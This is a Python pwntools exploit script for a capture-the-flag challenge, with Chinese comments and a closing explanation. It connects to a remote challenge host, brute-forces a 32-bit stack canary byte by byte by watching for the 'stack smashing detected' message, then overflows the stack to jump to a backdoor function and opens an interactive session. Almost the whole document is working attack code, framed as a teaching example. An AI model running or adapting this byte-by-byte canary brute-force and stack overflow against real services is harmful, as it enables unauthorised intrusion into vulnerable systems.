from pwn import *
import time

#context(arch = 'amd64', os = 'linux', log_level = 'debug')
context(arch = 'i386', os = 'linux', log_level = 'debug')

io = remote('pwn.challenge.ctf.show', 28122)
elf = ELF('./pwn')
libc = ELF('./libc.so.6')

# backdoor=elf.sym['backdoor']：backdoor函数的地址
backdoor=elf.sym['backdoor']

# canary = b'\x00'：初始化canary值，canary的最低位通常为0x00
canary = b'\x00'

# 循环爆破canary的剩余3个字节
for i in range(3):
    for j in range(0, 256):
        print("idx:"+str(i)+":"+chr(j))
        # 构造payload，填充到canary位置，然后尝试当前字节
        payload = b'a' * (0x70 - 0xc) + canary + bytes([j])
        io.send(payload)
        time.sleep(0.3)
        text = io.recv()
        print(text)
        # 如果没有检测到栈溢出，说明当前字节正确
        if (b"stack smashing detected" not in text):
            canary += bytes([j])
            print(b"Canary:" + canary)
            break

# 构造完整的payload，包含canary和backdoor地址
payload = b'a' * (0x70 - 0xc) + canary + b'a' * 0xc + p32(backdoor)
io.send(payload)
io.recv()
io.interactive()

"""
【知识点讲解】
1. 题目类型：canary bypass - Canary保护爆破
2. 核心原理：
   - 利用Canary的特性（最低位为0x00）进行逐字节爆破
   - 通过检测程序是否崩溃来确定canary的正确值
3. 关键步骤：
   - 初始化canary为\x00（最低位）
   - 循环尝试剩余3个字节的可能值
   - 构造payload并发送，检测程序是否崩溃
   - 找到正确的canary后，构造包含canary的payload执行backdoor
4. 执行流程：
   - 爆破canary -> 构造payload -> 触发栈溢出 -> 执行backdoor
5. 技术要点：
   - Canary保护机制的特性
   - 逐字节爆破技术
   - 栈溢出利用
"""
